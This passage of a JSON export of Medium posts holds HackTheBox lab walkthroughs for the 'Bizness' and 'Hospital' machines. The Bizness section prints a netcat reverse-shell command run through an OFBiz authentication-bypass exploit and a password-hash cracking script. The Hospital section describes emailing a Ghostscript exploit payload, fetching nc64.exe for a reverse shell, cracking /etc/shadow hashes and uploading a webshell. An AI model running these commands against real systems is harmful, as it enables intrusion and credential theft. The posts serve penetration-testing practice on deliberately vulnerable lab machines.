alt=\"\" src=\"https://cdn images 1.medium.com/max/360/1 TkyHSsLD4hZPHYaTQR8BLw.png\" <figcaption Local flag 2</figcaption </figure <p The next objective is to find the root user flag by performing Privilege Escalation.</p <h4 Privilage Escalation</h4 <p At this stage, I need to delve deeper into valuable information that can be used to gain root access.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/632/1 TfLiqylKBq0mLGAWwmhJsw.png\" <figcaption Find information</figcaption </figure <p On that path, there is a file named “AdminUserLoginData.xml.” When opened, it will display information as shown in the image below.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/637/1 6SnggQXMteaz8v3TfVcoEQ.png\" <figcaption Got hashed user credential</figcaption </figure <p I see UserLoginId and CurrentPassword, but here it seems I need to perform password cracking on them.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/622/1 kq7QMsxldhH sGLmSivulw.png\" <figcaption Hashed password</figcaption </figure <p In the next stage, I will attempt to crack the password using the following script:</p <pre import hashlib<br import base64<br import os<br <br def cryptBytes(hash type, salt, value);<br if not hash type:<br hash type = \"SHA\"<br if not salt:<br salt = base64.urlsafe b64encode(os.urandom(16)).decode('utf 8')<br hash obj = hashlib.new(hash type)<br hash obj.update(salt.encode('utf 8'))<br hash obj.update(value)<br hashed bytes = hash obj.digest()<br result = f\"${hash type}${salt}${base64.urlsafe b64encode(hashed bytes).decode('utf 8').replace('+', '.')}\"<br return result<br def getCryptedBytes(hash type, salt, value)<br try:<br hash obj = hashlib.new(hash type)<br hash obj.update(salt.encode('utf 8'))<br hash obj.update(value)<br hashed bytes = hash obj.digest()<br return base64.urlsafe b64encode(hashed bytes).decode('utf 8').replace('+', '.')<br except hashlib.NoSuchAlgorithmException as e:<br raise Exception(f\"Error While computing hash of type {hash type}: {e}\")<br <br <br Mendefinisikan variabel<br hash type = \"SHA1\"<br salt = \"d\"<br search = \"$SHA1$d$uP0 QaVBpDWFeo8 dRzDqRwXQ2I=\"<br wordlist = \"/usr/share/wordlists/rockyou.txt\"<br <br Membuka file wordlist<br with open(wordlist,'r',encoding='latin 1') as password list:<br for password in password list:<br value = password.strip()<br <br Menghitung hash password<br hashed password = crypt bytes(hash type, salt, value.encode('utf 8'))<br <br Membandingkan hash dengan yang dicari<br if hashed password == search:<br print(f\"Found Password: {value}, hash: {hashed password}\")<br break</pre <p I successfully cracked the hash to obtain the password.</p <p To gain root access, you can use the “su” command and enter the password obtained through the cracking process.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/486/1 3gncBaRruVXTCvoLUl nzg.png\" <figcaption Root flag</figcaption </figure <p Thank you for reading my post.</p <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=72c87fed37b2\" width=\"1\" height=\"1\" alt=\"\"",
    "excerpt": "<h3 HackTheBox — Bizness</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/720/1 ruqyxFAV3JEWq4A7qxxZHw.png\" <figcaption Hack The Box — Bizness</figcaption </figure <p Today, I will be tackling the challen…",
    "description": "<h3 HackTheBox — Bizness</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/720/1 ruqyxFAV3JEWq4A7qxxZHw.png\" <figcaption Hack The Box — Bizness</figcaption </figure <p Today, I will be tackling the challenge from Hack The Box with the machine code “Bizness”,this machine is Linux based.</p <h4 <strong Enumeration</strong </h4 <p In the first step, we need to conduct information gathering first to check the open ports and identify the services running on the server. Here, I use the Nmap tool for information gathering.</p <pre nmap sCV script vulns Pn oA biness &lt;IP&gt;</pre <p Here is information about the server that we obtained through enumeration using Nmap :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/634/1 QfkxVewvJDRy1NMC2C7WQA.png\" <figcaption Nmap Result</figcaption </figure <p There are three running services observed, including:</p <ul <li Port 22 &gt; OpenSSH</li <li Port 80 &gt; Http &gt; Nginx 1.18.0</li <li Port 443 &gt; ssl/http &gt; Nginx 1.18.0</li </ul <p Now, I am trying to add a host entry for the IP using the URL “bizness.htb” in the /etc/hosts file.</p <p Next, here I attempt to open the page and gather information for further exploitation. When the website is opened, a landing page will appear as shown in the following image:</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/631/1 Nf2eiQ3YkGA0ujNQf1xsFQ.png\" <figcaption Web page</figcaption </figure <p After further investigation, it seems that there is nothing I can use as an entry point. However, I am trying again to perform Directory Enumeration using Dirsearch.</p <pre dirsearch u &lt;ip&gt;</pre <p Here are the results of the Directory Enumeration:</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/631/1 coBt2GC4CxapBVbpWP1AjQ.png\" <figcaption Dirsearch Result</figcaption </figure <p Here, we successfully obtained the login page at the endpoint (<a href=\"https://bizness.htb/control/login\" https://bizness.htb/control/login</a ), which is the default login page of Apache Ofbiz.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/639/1 nGjYaXqpVn0aBsfRrO T8A.png\" <figcaption Apache OfBiz login page</figcaption </figure <h4 Vulnerability Analysis</h4 <p At this stage, I am attempting to search for public exploit information or CVE related to Apache Ofbiz. When searching for a public exploit for Apache Ofbiz, I came across a documented vulnerability with CVE 2023–51467.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/638/1 zYLU81IDF ppwknOxPgWiA.png\" <figcaption CVE Details</figcaption </figure <p Next, I am searching for exploits related to CVE to analyze whether this used Apache Orbiz is vulnerable to that specific vulnerability.</p <h4 Exploitation</h4 <p Here, I successfully obtained an exploit for performing authentication bypass, which can be found in the following repository : <a href=\"https://github.com/jakabakos/Apache OFBiz Authentication Bypass.git\" Click here</a </p <p It appears that the utilized Apache OFBiz is still vulnerable.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/598/1 nWDu8fm0B6eDoHfCwwW36w.png\" <figcaption Vulnerable target</figcaption </figure <p In the next step, I will attempt to obtain a reverse shell on the server using the following command.</p <pre python3 exploit.py url https://bizness.htb/ cmd 'nc c bash &lt;IP&gt; &lt;PORT&gt;'</pre <p Please set up the listener using netcat beforehand.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/630/1 J8BY8wzncLHGhyRA6t9Giw.png\" <figcaption Netcat listener</figcaption </figure <p Then input the aforementioned exploit command to successfully obtain a Reverse Shell.</p <p As seen in the image below, I have successfully acquired a shell.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/594/1 q17WvjpCZG1i6aREWOPgfA.png\" <figcaption Generated Payload</figcaption </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/639/1 DeVG7HtGeZ8rkDmH4EnA0Q.png\" <figcaption Got reverse shell</figcaption </figure <p The next step is to search for the flag for the local user.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/635/1 tB 3YZS7DwlJiBexhICIg.png\" <figcaption Local flag</figcaption </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/360/1 TkyHSsLD4hZPHYaTQR8BLw.png\" <figcaption Local flag 2</figcaption </figure <p The next objective is to find the root user flag by performing Privilege Escalation.</p <h4 Privilage Escalation</h4 <p At this stage, I need to delve deeper into valuable information that can be used to gain root access.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/632/1 TfLiqylKBq0mLGAWwmhJsw.png\" <figcaption Find information</figcaption </figure <p On that path, there is a file named “AdminUserLoginData.xml.” When opened, it will display information as shown in the image below.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/637/1 6SnggQXMteaz8v3TfVcoEQ.png\" <figcaption Got hashed user credential</figcaption </figure <p I see UserLoginId and CurrentPassword, but here it seems I need to perform password cracking on them.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/622/1 kq7QMsxldhH sGLmSivulw.png\" <figcaption Hashed password</figcaption </figure <p In the next stage, I will attempt to crack the password using the following script:</p <pre import hashlib<br import base64<br import os<br <br def cryptBytes(hash type, salt, value);<br if not hash type:<br hash type = \"SHA\"<br if not salt:<br salt = base64.urlsafe b64encode(os.urandom(16)).decode('utf 8')<br hash obj = hashlib.new(hash type)<br hash obj.update(salt.encode('utf 8'))<br hash obj.update(value)<br hashed bytes = hash obj.digest()<br result = f\"${hash type}${salt}${base64.urlsafe b64encode(hashed bytes).decode('utf 8').replace('+', '.')}\"<br return result<br def getCryptedBytes(hash type, salt, value)<br try:<br hash obj = hashlib.new(hash type)<br hash obj.update(salt.encode('utf 8'))<br hash obj.update(value)<br hashed bytes = hash obj.digest()<br return base64.urlsafe b64encode(hashed bytes).decode('utf 8').replace('+', '.')<br except hashlib.NoSuchAlgorithmException as e:<br raise Exception(f\"Error While computing hash of type {hash type}: {e}\")<br <br <br Mendefinisikan variabel<br hash type = \"SHA1\"<br salt = \"d\"<br search = \"$SHA1$d$uP0 QaVBpDWFeo8 dRzDqRwXQ2I=\"<br wordlist = \"/usr/share/wordlists/rockyou.txt\"<br <br Membuka file wordlist<br with open(wordlist,'r',encoding='latin 1') as password list:<br for password in password list:<br value = password.strip()<br <br Menghitung hash password<br hashed password = crypt bytes(hash type, salt, value.encode('utf 8'))<br <br Membandingkan hash dengan yang dicari<br if hashed password == search:<br print(f\"Found Password: {value}, hash: {hashed password}\")<br break</pre <p I successfully cracked the hash to obtain the password.</p <p To gain root access, you can use the “su” command and enter the password obtained through the cracking process.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/486/1 3gncBaRruVXTCvoLUl nzg.png\" <figcaption Root flag</figcaption </figure <p Thank you for reading my post.</p <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=72c87fed37b2\" width=\"1\" height=\"1\" alt=\"\"",
    "tags": [
      "pentesting",
      "vulnerability-assessment",
      "hack-the-box-writeup",
      "exploitation"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/hackthebox-bizness-72c87fed37b2?source=rss-e8b9da247cdf------2",
    "publishedDate": "2024-02-18 18:53:25",
    "updatedAt": "2024-02-18 18:53:25",
    "readingTime": 5,
    "cover": null
  },
  {
    "id": "https://medium.com/p/d63f8f9f75aa",
    "slug": "https://medium.com/p/d63f8f9f75aa",
    "title": "HackTheBox — Hospital",
    "content": "<h3 HackTheBox — Hospital</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 uxDem cooaHkZk8i20n1w.png\" </figure <p On this section, I will complete the challenge from Hack The Box — Hospital, where this machine uses a Windows operating system.</p <h4 Enumeration</h4 <p The first step is to conduct information gathering to see which ports are open and what services are running on the server. In this case, I use the Nmap tool to perform information gathering.</p <pre nmap sCV — script vulns Pn oA hospital &lt;IP&gt;</pre <p The following is information about the server that we obtained from enumeration using Nmap :</p <pre <br Host is up (0.037s latency).<br Not shown: 980 filtered tcp ports (no response)<br PORT STATE SERVICE VERSION<br 22/tcp open ssh OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)<br | ssh hostkey: <br | 256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)<br | 256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)<br 53/tcp open domain Simple DNS Plus<br 88/tcp open kerberos sec Microsoft Windows Kerberos (server time: 2024–02–15 00:02:56Z)<br 135/tcp open msrpc Microsoft Windows RPC<br 139/tcp open netbios ssn Microsoft Windows netbios ssn<br 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default First Site Name)<br | ssl cert: Subject: commonName=DC<br | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb<br | Not valid before: 2023–09–06T10:49:03<br | Not valid after: 2028–09–06T10:49:03<br 443/tcp open ssl/http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)<br | ssl date: TLS randomness does not represent time<br | tls alpn: <br | http/1.1<br | ssl cert: Subject: commonName=localhost<br | Not valid before: 2009–11–10T23:48:47<br | Not valid after: 2019–11–08T23:48:47<br | http title: Hospital Webmail :: Welcome to Hospital Webmail<br | http server header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28<br 445/tcp open microsoft ds?<br 464/tcp open kpasswd5?<br 593/tcp open ncacn http Microsoft Windows RPC over HTTP 1.0<br 636/tcp open ldapssl?<br | ssl cert: Subject: commonName=DC<br | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb<br | Not valid before: 2023–09–06T10:49:03<br | Not valid after: 2028–09–06T10:49:03<br 1801/tcp open msmq?<br 2103/tcp open msrpc Microsoft Windows RPC<br 2105/tcp open msrpc Microsoft Windows RPC<br 2107/tcp open msrpc Microsoft Windows RPC<br 2179/tcp open vmrdp?<br 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default First Site Name)<br | ssl cert: Subject: commonName=DC<br | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb<br | Not valid before: 2023–09–06T10:49:03<br | Not valid after: 2028–09–06T10:49:03<br 3269/tcp open globalcatLDAPssl?<br | ssl cert: Subject: commonName=DC<br | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb<br | Not valid before: 2023–09–06T10:49:03<br | Not valid after: 2028–09–06T10:49:03<br 3389/tcp open ms wbt server Microsoft Terminal Services<br | ssl cert: Subject: commonName=DC.hospital.htb<br | Not valid before: 2024–02–13T12:03:03<br | Not valid after: 2024–08–14T12:03:03<br | rdp ntlm info: <br | Target Name: HOSPITAL<br | NetBIOS Domain Name: HOSPITAL<br | NetBIOS Computer Name: DC<br | DNS Domain Name: hospital.htb<br | DNS Computer Name: DC.hospital.htb<br | DNS Tree Name: hospital.htb<br | Product Version: 10.0.17763<br | System Time: 2024–02–15T00:03:47+00:00<br 8080/tcp open http Apache httpd 2.4.55 ((Ubuntu))<br | http server header: Apache/2.4.55 (Ubuntu)<br | http title: Login<br | Requested resource was login.php<br | http open proxy: Proxy might be redirecting requests<br | http cookie flags: <br | /: <br | PHPSESSID: <br | httponly flag not set<br Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux kernel, cpe:/o:microsoft:windows<br Host script results:<br | clock skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s<br | smb2 security mode: <br | 3:1:1: <br | Message signing enabled and required<br | smb2 time: <br | date: 2024–02–15T00:03:50<br | start date: N/A<br Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br Nmap done at Wed Feb 14 12:04:28 2024–1 IP address (1 host up) scanned in 102.43 seconds<br </pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 Jk3 k 5aWYM3Ljf11uN4Pw.png\" <figcaption Got root access</figcaption </figure <p After successfully gaining root access, the next step is to search for credentials that we can use for gaining user access.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 QKD sM6nmiTX1vnbQcsphw.png\" <figcaption Looking /etc/s</figcaption </figure <p It appears that there is a user named “drwilliams” on the server. The next step is to attempt to crack the password to obtain User credentials.</p <p Let’s perform a check on /etc/shadow; the results provide us with two pieces of information:</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 RbhL6G6ttuZK TcAL9qEFw.png\" <figcaption Credential</figcaption </figure <p Next, I am cracking the hash using Hashcat to retrieve the password. This process takes some time, so please be patient.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 MqeQ31Brbg3hyWpj0goWzg.png\" <figcaption Cracking password</figcaption </figure <p I successfully obtained the password.</p <p In the next step, I will log in to the aforementioned Roundcube email page using the credentials I have obtained. The display will then appear as follows.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 meSUldJqmokOJILdovqHbg.png\" <figcaption Login into webmail</figcaption </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 4jMiYOm7qJH1KlxnTIrlYA.png\" <figcaption Message from drbrown</figcaption </figure <p In the email, it is stated that we need to submit a design in <em .eps </em format, which utilizes Ghostscript for running. After that, we discovered the exploit. <a href=\"https://github.com/jakabakos/CVE 2023 36664 Ghostscript command injection.git\" Click here</a </p <p Here, I am trying to create a payload using the aforementioned exploit in the <em .eps</em format, where its function is to ensure that the nc64.exe file on my machine can be sent to the server.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1006/1 ATD0F3vG3m5Js5NiAIe BQ.png\" <figcaption Create exploit.</figcaption </figure <p The next step involves sending an email with an attachment containing the payload I created earlier. This ensures successful file transmission.</p <pre python3 m http.server 8083</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 S3 mAX10frbHUSLAcwr7w.png\" <figcaption Sending exploit to victims machine</figcaption </figure <p The file appears to have been sent; now, I am creating another payload to obtain a reverse shell on that server.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 kphEiXUN7UNPwZdv rk 9g.png\" </figure <p Send an email back to Dr. Brown using the above created payload as an attachment.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 fyON Z1GsqhoRWUwDuSAUg.png\" <figcaption Send payload as email attachment</figcaption </figure <p I successfully got an Revshell to windows machine</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 OJHi 40veVODEYMxDtO1g.png\" <figcaption Got windows shell</figcaption </figure <p After that, I tried to view the contents of Ghostscript.bat and found credential information for the user DrBrown.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 elaqFxQSLRw3fhDc5kqjCg.png\" <figcaption Drbrown credential</figcaption </figure <p Here, I have successfully obtained the user flag.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/897/1 4Aqe78fT5VanciJZ 8EM2g.png\" <figcaption User flag</figcaption </figure <p Then I tried to access the system using Dr. Brown’s credentials.</p <pre rpcclient U ‘drbrown’ &lt;IP&gt;</pre <p After successfully gaining access, the next step is to perform <a href=\"https://book.hacktricks.xyz/network services pentesting/pentesting smb/rpcclient enumeration\" RPC Client Enumeration</a .</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 oNfJuT6y0sXeMvBFDYWS8Q.png\" <figcaption RPC Client Enumeration</figcaption </figure <p After connecting, use the “<em querydispinfo</em ” command to inspect the data. You will observe that Administrator information is shared alongside the Guest user.</p <p Here, I am again uploading the p0wny shell to the /htdocs path in order to obtain a webshell.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/669/1 cWMoU74ufkYVxmYCxGajbA.png\" <figcaption Upload p0wny shell to windows machine</figcaption </figure <p Then, I accessed the webshell through the web server’s webpage.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 qhC9TLhyeYjKwiu14lPNUQ.png\" <figcaption p0wny shell</figcaption </figure <p Then I attempted to access the path C:\\Users\\Administrator\\Desktop, where I found a root.txt file containing the flag for the root user.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 TvedObmzwtmnU7qSyqoYZQ.png\" <figcaption Root flag</figcaption </figure <h4 Conclusion</h4 <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=d63f8f9f75aa\" width=\"1\" height=\"1\" alt=\"\"",
    "excerpt": "<h3 HackTheBox — Hospital</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 uxDem cooaHkZk8i20n1w.png\" </figure <p On this section, I will complete the challenge from Hack The Box — Hospital, where…",
    "description": "<h3 HackTheBox — Hospital</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 uxDem cooaHkZk8i20n1w.png\" </figure <p On this section, I will complete the challenge from Hack The Box — Hospital, where this machine uses a Windows operating system.</p <h4 Enumeration</h4 <p The first step is to conduct information gathering to see which ports are open and what services are running on the server. In this case, I use the Nmap tool to perform information gathering.</p <pre nmap sCV — script vulns Pn oA hospital &lt;IP&gt;</pre <p The following is information about the server that we obtained from enumeration using Nmap :</p <pre <br Host is up (0.037s latency).<br Not shown: 980 filtered tcp ports (no response)<br PORT STATE SERVICE VERSION<br 22/tcp open ssh OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)<br | ssh hostkey: <br | 256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)<br | 256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)<br 53/tcp open domain Simple DNS Plus<br 88/tcp open kerberos sec Microsoft Windows Kerberos (server time: 2024–02–15 00:02:56Z)<br 135/tcp open msrpc Microsoft Windows RPC<br 139/tcp open netbios ssn Microsoft Windows netbios ssn<br 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default First Site Name)<br | ssl cert: Subject: commonName=DC<br | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb<br | Not valid before: 2023–09–06T10:49:03<br | Not valid after: 2028–09–06T10:49:03<br 443/tcp open ssl/http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)<br | ssl date: TLS randomness does not represent time<br | tls alpn: <br | http/1.1<br | ssl cert: Subject: commonName=localhost<br | Not valid before: 2009–11–10T23:48:47<br | Not valid after: 2019–11–08T23:48:47<br | http title: Hospital Webmail :: Welcome to Hospital Webmail<br | http server header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28<br 445/tcp open microsoft ds?<br 464/tcp open kpasswd5?<br 593/tcp open ncacn http Microsoft Windows RPC over HTTP 1.0<br 636/tcp open ldapssl?<br | ssl cert: Subject: commonName=DC<br | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb<br | Not valid before: 2023–09–06T10:49:03<br | Not valid after: 2028–09–06T10:49:03<br 1801/tcp open msmq?<br 2103/tcp open msrpc Microsoft Windows RPC<br 2105/tcp open msrpc Microsoft Windows RPC<br 2107/tcp open msrpc Microsoft Windows RPC<br 2179/tcp open vmrdp?<br 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default First Site Name)<br | ssl cert: Subject: commonName=DC<br | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb<br | Not valid before: 2023–09–06T10:49:03<br | Not valid after: 2028–09–06T10:49:03<br 3269/tcp open globalcatLDAPssl?<br | ssl cert: Subject: commonName=DC<br | Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb<br | Not valid before: 2023–09–06T10:49:03<br | Not valid after: 2028–09–06T10:49:03<br 3389/tcp open ms wbt server Microsoft Terminal Services<br | ssl cert: Subject: commonName=DC.hospital.htb<br | Not valid before: 2024–02–13T12:03:03<br | Not valid after: 2024–08–14T12:03:03<br | rdp ntlm info: <br | Target Name: HOSPITAL<br | NetBIOS Domain Name: HOSPITAL<br | NetBIOS Computer Name: DC<br | DNS Domain Name: hospital.htb<br | DNS Computer Name: DC.hospital.htb<br | DNS Tree Name: hospital.htb<br | Product Version: 10.0.17763<br | System Time: 2024–02–15T00:03:47+00:00<br 8080/tcp open http Apache httpd 2.4.55 ((Ubuntu))<br | http server header: Apache/2.4.55 (Ubuntu)<br | http title: Login<br | Requested resource was login.php<br | http open proxy: Proxy might be redirecting requests<br | http cookie flags: <br | /: <br | PHPSESSID: <br | httponly flag not set<br Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux kernel, cpe:/o:microsoft:windows<br Host script results:<br | clock skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s<br | smb2 security mode: <br | 3:1:1: <br | Message signing enabled and required<br | smb2 time: <br | date: 2024–02–15T00:03:50<br | start date: N/A<br Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br Nmap done at Wed Feb 14 12:04:28 2024–1 IP address (1 host up) scanned in 102.43 seconds<br </pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 Jk3 k 5aWYM3Ljf11uN4Pw.png\" <figcaption Got root access</figcaption </figure <p After successfully gaining root access, the next step is to search for credentials that we can use for gaining user access.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 QKD sM6nmiTX1vnbQcsphw.png\" <figcaption Looking /etc/s</figcaption </figure <p It appears that there is a user named “drwilliams” on the server. The next step is to attempt to crack the password to obtain User credentials.</p <p Let’s perform a check on /etc/shadow; the results provide us with two pieces of information:</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 RbhL6G6ttuZK TcAL9qEFw.png\" <figcaption Credential</figcaption </figure <p Next, I am cracking the hash using Hashcat to retrieve the password. This process takes some time, so please be patient.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 MqeQ31Brbg3hyWpj0goWzg.png\" <figcaption Cracking password</figcaption </figure <p I successfully obtained the password.</p <p In the next step, I will log in to the aforementioned Roundcube email page using the credentials I have obtained. The display will then appear as follows.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 meSUldJqmokOJILdovqHbg.png\" <figcaption Login into webmail</figcaption </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 4jMiYOm7qJH1KlxnTIrlYA.png\" <figcaption Message from drbrown</figcaption </figure <p In the email, it is stated that we need to submit a design in <em .eps </em format, which utilizes Ghostscript for running. After that, we discovered the exploit. <a href=\"https://github.com/jakabakos/CVE 2023 36664 Ghostscript command injection.git\" Click here</a </p <p Here, I am trying to create a payload using the aforementioned exploit in the <em .eps</em format, where its function is to ensure that the nc64.exe file on my machine can be sent to the server.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1006/1 ATD0F3vG3m5Js5NiAIe BQ.png\" <figcaption Create exploit.</figcaption </figure <p The next step involves sending an email with an attachment containing the payload I created earlier. This ensures successful file transmission.</p <pre python3 m http.server 8083</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 S3 mAX10frbHUSLAcwr7w.png\" <figcaption Sending exploit to victims machine</figcaption </figure <p The file appears to have been sent; now, I am creating another payload to obtain a reverse shell on that server.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 kphEiXUN7UNPwZdv rk 9g.png\" </figure <p Send an email back to Dr. Brown using the above created payload as an attachment.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 fyON Z1GsqhoRWUwDuSAUg.png\" <figcaption Send payload as email attachment</figcaption </figure <p I successfully got an Revshell to windows machine</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 OJHi 40veVODEYMxDtO1g.png\" <figcaption Got windows shell</figcaption </figure <p After that, I tried to view the contents of Ghostscript.bat and found credential information for the user DrBrown.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 elaqFxQSLRw3fhDc5kqjCg.png\" <figcaption Drbrown credential</figcaption </figure <p Here, I have successfully obtained the user flag.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/897/1 4Aqe78fT5VanciJZ 8EM2g.png\" <figcaption User flag</figcaption </figure <p Then I tried to access the system using Dr. Brown’s credentials.</p <pre rpcclient U ‘drbrown’ &lt;IP&gt;</pre <p After successfully gaining access, the next step is to perform <a href=\"https://book.hacktricks.xyz/network services pentesting/pentesting smb/rpcclient enumeration\" RPC Client Enumeration</a .</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 oNfJuT6y0sXeMvBFDYWS8Q.png\" <figcaption RPC Client Enumeration</figcaption </figure <p After connecting, use the “<em querydispinfo</em ” command to inspect the data. You will observe that Administrator information is shared alongside the Guest user.</p <p Here, I am again uploading the p0wny shell to the /htdocs path in order to obtain a webshell.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/669/1 cWMoU74ufkYVxmYCxGajbA.png\" <figcaption Upload p0wny shell to windows machine</figcaption </figure <p Then, I accessed the webshell through the web server’s webpage.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 qhC9TLhyeYjKwiu14lPNUQ.png\" <figcaption p0wny shell</figcaption </figure <p Then I attempted to access the path C:\\Users\\Administrator\\Desktop, where I found a root.txt file containing the flag for the root user.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 TvedObmzwtmnU7qSyqoYZQ.png\" <figcaption Root flag</figcaption </figure <h4 Conclusion</h4 <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=d63f8f9f75aa\" width=\"1\" height=\"1\" alt=\"\"",
    "tags": [
      "hackthebox",
      "vulnerability-assessment",
      "penetration-testing"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/hackthebox-hospital-d63f8f9f75aa?source=rss-e8b9da247cdf------2",
    "publishedDate": "2024-02-16 02:34:35",
    "updatedAt": "2024-02-16 02:34:35",
    "readingTime": 6,
    "cover": null
  },
  {
    "id": "https://medium.com/p/8f3956ba70ec",
    "slug": "https://medium.com/p/8f3956ba70ec",
    "title": "[Day 3] Try Hack Me — Advent Of Cyber 2023",
